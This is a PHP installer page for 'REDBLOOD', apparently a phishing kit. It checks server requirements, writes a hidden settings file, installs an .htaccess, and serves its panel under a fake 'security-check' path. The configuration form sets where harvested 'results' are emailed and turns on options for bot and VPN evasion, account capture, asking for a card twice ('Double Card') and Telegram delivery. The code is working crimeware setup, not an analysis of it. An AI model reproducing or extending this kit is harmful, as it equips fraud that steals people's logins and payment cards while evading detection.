<?php

session_start();
if (is_file('../REDBLOOD/Go/.settings.ini')) {
  header('Location: /security-check/panel/login');
  exit();
}
ini_set('max_execution_time', 300);
if (isset($_POST['gass'])) {
  $result           = $_POST["result"];
  $parameter           = $_POST["parameter"];
  $rbtoken           = $_POST["rbtoken"];
  $antibot           = $_POST["antibot"];
  $killbot           = $_POST["killbot"];
  $getaccount           = $_POST["getaccount"];
  $vpndetect           = $_POST["vpndetect"];
  $doublecard          = $_POST["doublecard"];
  $telegram             = $_POST["telegram"];

  if (empty($result && $parameter && $rbtoken && $antibot && $killbot && $getaccount && $vpndetect &&  $doublecard && $telegram)) {
    $_SESSION["sukses"] = 'swal("Error!", "Please input all fields.", "error");';
    $_SESSION['tampil'] = 'js-active';
    $_SESSION['tmp'] = 'js-active';
    $_SESSION['hide'] = 'hide';
    header('Location: /');
    exit();
  }
  if (filter_var($result, FILTER_VALIDATE_EMAIL) === false) {
    $_SESSION["sukses"] = 'swal("Error!", "Please Enter a Valid Email.", "error");';
    $_SESSION['tampil'] = 'js-active';
    $_SESSION['tmp'] = 'js-active';
    $_SESSION['hide'] = 'hide';
    header('Location: /');
    exit();
  }

  $f = fopen("../REDBLOOD/Go/.settings.ini", "w");
  $R1 = substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 4);
  $R2 = substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 4);
  $R3 = substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 4);
  $R4 = substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 0, 4);
  $license = 'RBLD-' . $R1 . '-' . $R2 . '-' . $R3 . '-' . $R4 . '';
  $domain = 'https://' . $_SERVER['SERVER_NAME'];
  setcookie('token', $license, time() + (86400 * 30), "/");
  setcookie('panel', $domain . '/security-check/panel/login', time() + (86400 * 30), "/");
  setcookie('linksc', $domain . '/?' . $parameter, time() + (86400 * 30), "/");
  setcookie('copyright', 'REDBLOOD', time() + (86400 * 30), "/");
  fwrite($f, "TOKEN = \"$license\"\nRESULT = \"$result\"\nPARAMETER = \"$parameter\"\nRBTOKEN = \"$rbtoken\"\nANTIBOT = \"$antibot\"\nKILLBOT = \"$killbot\"\nGETACCOUNT = \"$getaccount\"\nVPNDETECT = \"$vpndetect\"\nDOUBLECARD = \"$doublecard\"\nTELEGRAM = \"$telegram\"\n");
  fclose($f);
  rename("data/rb.htaccess", "../.htaccess");
  $_SESSION["sukses"] = 'swal("success", "SCRIPT INSTALL SUCCESS", "success");';
  header('Location: /security-check/panel/finished');
  exit();
}
$phpversionsuccess = false;
$curlsuccess = false;
$displayerrorssuccess = false;
$zliboutputcompressionsuccess = false;
$timezonesuccess = false;
$phprequired = "7.4";
$phpversion = PHP_VERSION;
if (version_compare($phpversion, $phprequired) >= 0) {
  $phpversionsuccess = true;
}
if (function_exists("curl_version")) {
  $curlsuccess = true;
}
if (ini_get('display_errors')) {
  $displayerrorssuccess = true;
}
if (ini_get('zlib.output_compression')) {
  $zliboutputcompressionsuccess = true;
}
$timezonesettings = ini_get('date.timezone');
if ($timezonesettings) {
  $timezonesuccess = true;
}
if ($phpversionsuccess && $curlsuccess && $timezonesuccess && $displayerrorssuccess && $zliboutputcompressionsuccess) {
  $all_requirement_success = true;
} else {
  $all_requirement_success = false;
}
$writeable_directories = array(
  'REDBLOOD' => '/REDBLOOD',
  'REDBLOODGo' => '/REDBLOOD/Go'
);
foreach ($writeable_directories as $value) {
  if (!is_writeable(".." . $value)) {
    $all_requirement_success = false;
  }
}
$dashboardurl = $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
$dashboardurl = preg_replace('/install.*/', '', $dashboardurl);
if (!empty($_SERVER['HTTPS'])) {
  $dashboardurl = 'https://' . $dashboardurl;
} else {
  $dashboardurl = 'http://' . $dashboardurl;
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Redblood | Install</title>
  <link href="https://fonts.googleapis.com/css?family=Poppins:400,600&display=swap" rel="stylesheet">
  <link href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css' rel='stylesheet'>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <link href="../REDBLOOD/Assets/css/rb.install.style.css" rel="stylesheet">
</head>

<body style="background-color: black;">
  <header class="header text-center mt-4">
    <img src="https://i.ibb.co/S70LBhQ/RBred.png" alt="redblood" width="150">
    <div class="text-center">
        <h5 class="text-center text-danger mt-3">REDBLOOD SCRIPT INSTALATIONS</h5>
    </div>
  </header>
  <div class="content">
    <div class="content__inner">
      <div class="container overflow-hidden">
        <div class="multisteps-form">
          <div class="row">
            <div class="col-12 col-lg-8 ml-auto mr-auto mb-4">
              <div class="multisteps-form__progress text-center mt-2">
                <button class="btn-danger rounded js-active" title="Pre-Installation" disabled>REQ</button>
                <button class="btn-danger rounded <?php echo @$_SESSION['tampil'] ? $_SESSION['tampil'] : ''; ?><?php unset($_SESSION['tampil']); ?>" title="Configuration" disabled>CONFIGS</button>
                <button class="btn-danger rounded" title="Finished" disabled>SUCCESS</button>
              </div>
            </div>
          </div>
          <div class="row">
            <div class="col-12 col-lg-8 m-auto">
              <form action="" method="POST" class="multisteps-form__form">
                <div class="multisteps-form__panel shadow p-4 rounded <?php echo @$_SESSION['hide'] ? $_SESSION['hide'] : 'js-active'; ?><?php unset($_SESSION['hide']); ?>" data-animation="slideHorz">
                  <div class="multisteps-form__content">
                    <div class="form-row mt-4">
                      <div class="col">
                        <h5 class="text-warning text-center" style="text-align:; font-family:calibri; font-weight:bolder; letter-spacing: 1px;">PHP Requirements</h5>
                        <hr />
                        <table>
                          <thead class="text-center">
                            <tr>
                              <th class="text-warning text-center">PHP Info</th>
                              <th class="text-warning text-center">Current Version</th>
                              <th class="text-warning text-center">Req Version</th>
                              <th class="text-warning text-center">Status</th>
                            </tr>
                          </thead>
                          <tbody>
                            <tr>
                              <td class="text-info text-center">PHP Version</td>
                              <td class="text-white text-center"><?php echo $phpversion; ?></td>
                              <td class="text-white text-center"><?php echo $phprequired; ?>+</td>
                              <td>
                                <?php if ($phpversionsuccess) { ?>
                                  <p class="text-success text-center"><i class="fa fa-check text-success"></i> Ready</p>
                                <?php } else { ?>
                                  <p class="text-danger text-center"><i class="fa fa-xmark text-primary"> Not Ready</p>
                                <?php } ?>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                      </div>
                    </div>
                    <div class="form-row mt-4">
                      <div class="col">
                        <h5 class="text-warning text-center" style="text-align:; font-family:calibri; font-weight:bolder; letter-spacing: 1px;">Extenstions Requirement</h5>
                        <hr />
                        <table>
                          <thead>
                            <tr>
                              <th class="text-warning text-center">PHP Info</th>
                              <th class="text-warning text-center">Current Version</th>
                              <th class="text-warning text-center">Req Version</th>
                              <th class="text-warning text-center">Status</th>
                            </tr>
                          </thead>

                          <tbody>
                            <tr>
                              <td class="text-info text-center">cURL</td>
                              <td class="text-white text-center"> <?php if ($curlsuccess) { ?>
                                  On
                                <?php } else { ?>
                                  Off
                                <?php } ?>
                              </td>
                              <td class="text-white text-center">On</td>
                              <td>
                                <?php if ($curlsuccess) { ?>
                                  <p class="text-success text-center"><i class="fa fa-check text-success"></i> Ready</p>
                                <?php } else { ?>
                                  <p class="text-danger text-center"><i class="fa fa-xmark text-primary"> Not Ready</p>
                                <?php } ?>
                              </td>
                            </tr>
                            <tr>
                              <td class="text-info text-center">display_errors</td>
                              <td class="text-dark text-center"> <?php if ($displayerrorssuccess) { ?>
                                  On
                                <?php } else { ?>
                                  Off
                                <?php } ?>
                              </td>
                              <td class="text-center">On</td>
                              <td>
                                <?php if ($displayerrorssuccess) { ?>
                                  <p class="text-success text-center"><i class="fa fa-check text-success"></i> Ready</p>
                                <?php } else { ?>
                                  <p class="text-danger text-center"><i class="fa fa-xmark text-primary"> Not Ready</p>
                                <?php } ?>
                              </td>
                            </tr>
                            <tr>
                              <td class="text-info text-center">zlib.output_compression</td>
                              <td class="text-white text-center"> <?php if ($zliboutputcompressionsuccess) { ?>
                                  On
                                <?php } else { ?>
                                  Off
                                <?php } ?>
                              </td>
                              <td class="text-white text-center">On</td>
                              <td>
                                <?php if ($zliboutputcompressionsuccess) { ?>
                                  <p class="text-success text-center"><i class="fa fa-check text-success"></i> Ready</p>
                                <?php } else { ?>
                                  <p class="text-danger text-center"><i class="fa fa-xmark text-primary"> Not Ready</p>
                                <?php } ?>
                              </td>
                            </tr>
                            <tr>
                              <td class="text-info text-center">date.timezone</td>
                              <td class="text-dark text-center"> <?php if ($timezonesuccess) {
                                      echo $timezonesettings;
                                    } else {
                                      echo "Null";
                                    } ?>
                              </td>
                              <td class="text-dark text-center">Timezone</td>
                              <td>
                                <?php if ($timezonesuccess) { ?>
                                  <p class="text-success text-center"><i class="fa fa-check text-success"></i> Ready</p>
                                <?php } else { ?>
                                  <p class="text-danger text-center"><i class="fa fa-xmark text-primary"> Not Ready</p>
                                <?php } ?>
                              </td>
                            </tr>
                          </tbody>
                        </table>
                      </div>
                    </div>
                    <div class="form-row mt-4">
                      <div class="col">
                        <p><h5 class="text-warning text-center" style="text-align:; font-family:calibri; font-weight:bolder; letter-spacing: 1px;">Permission Requirements </h5>
                        <hr />
                        <table>
                          <tbody>
                            <?php
                            foreach ($writeable_directories as $value) {
                            ?>
                              <tr>
                                <td class="text-info text-center"><?php echo $value; ?></td>
                                <td class="text-dark text-center">
                                  <?php if (is_writeable(".." . $value)) { ?>
                                    <p class="text-success text-center"><i class="fa fa-check text-success"></i> Ready</p>
                                  <?php
                                  } else {
                                    $all_requirement_success = false;
                                  ?>
                                    <p class="text-danger text-center"><i class="fa fa-xmark text-primary"></i> Not Ready</p>
                                  <?php } ?>
                                </td>
                              </tr>
                            <?php
                            }
                            ?>
                          </tbody>
                        </table>
                      </div>
                    </div>
                    <div class="button-row d-flex mt-4">
                      <button <?php
                              if (!$all_requirement_success) {
                                echo "disabled=disabled";
                              }
                              ?> class="btn btn-primary ml-auto js-btn-next" type="button" title="Next"><i class="fa fa-arrow-right"></i> Next</button>
                    </div>
                  </div>
                </div>
                <div class="multisteps-form__panel shadow p-4 rounded <?php echo @$_SESSION['tmp'] ? $_SESSION['tmp'] : 'hide'; ?><?php unset($_SESSION['tmp']); ?>" data-animation="slideHorz">
                  <h3 class="multisteps-form__title text-warning text-center">CONFIGURATIONS</h3>
                  <div class="multisteps-form__content">
                    <div class="form-row mt-4">
                      <div class="col">
                        <label class="text-info"><i class="fa fa-envelope me-2"></i> Result To Email</label>
                        <input class="multisteps-form__input form-control" type="text" name="result" value="admin@redblood.com" />
                      </div>
                    </div>
                    <div class="form-row mt-4">
                      <div class="col">
                        <label class="text-info"><i class="fa fa-globe me-2"></i> Parameter</label>
                        <input class="multisteps-form__input form-control" type="text" name="parameter" value="verified" />
                      </div>
                    </div>
                    <div class="form-row mt-4">
                      <div class="col-12 col-sm-4 mt-4 mt-sm-0">
                        <label class="text-info"><i class="fa fa-bug m-2"></i> RB Blocker</label>
                        <select name="rbtoken" class="form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-4 mt-4 mt-sm-0">
                        <label class="text-info"><i class="fa fa-bug m-2"></i> AntiBots</label>
                        <select name="antibot" class="form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-4 mt-4 mt-sm-0">
                        <label class="text-info"><i class="fa fa-bug m-2"></i> KillBots</label>
                        <select name="killbot" class="form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                    </div>
                    <div class="form-row mt-4">
                      <div class="col-12 col-sm-3 mt-4 mt-sm-0">
                        <label class="text-info"><i class="fa fa-user-plus m-2"></i> Get Account</label>
                        <select name="getaccount" class="multisteps-form__select form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                        <label class="text-info"><i class="fa fa-ghost m-2"></i> Block VPN</label>
                        <select name="vpndetect" class="multisteps-form__select form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                        <label class="text-info"><i class="fa fa-credit-card m-2 m-2"></i> Double Card</label>
                        <select name="doublecard" class="multisteps-form__select form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                      <div class="col-6 col-sm-3 mt-4 mt-sm-0">
                        <label class="text-info"><i class="fab fa-telegram m-2 m-2"></i> Telegram</label>
                        <select name="telegram" class="multisteps-form__select form-control">
                          <option selected="selected" value="off">Off</option>
                          <option value="on">On</option>
                        </select>
                      </div>
                    </div>
                    <div class="button-row d-flex mt-4">
                      <button class="btn btn-danger js-btn-prev" type="button" title="Prev"><i class="fa fa-arrow-left m-2"></i> BACK</button>
                      <button class="btn btn-primary ml-auto" <?php
                                                              if (!$all_requirement_success) {
                                                                echo "disabled=disabled";
                                                              }
                                                              ?> name="gass" type="submit" title="Install"><i class="fa fa-check m-2"></i> CONFIRM</button>
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.js"></script>
  <script src="../REDBLOOD/Assets/js/rb.install.script.js"></script>
  <?php if (@$_SESSION['sukses']) { ?>
    <script>
      <?php echo $_SESSION['sukses']; ?>
    </script>
  <?php unset($_SESSION['sukses']);
  } ?>
</body>

</html>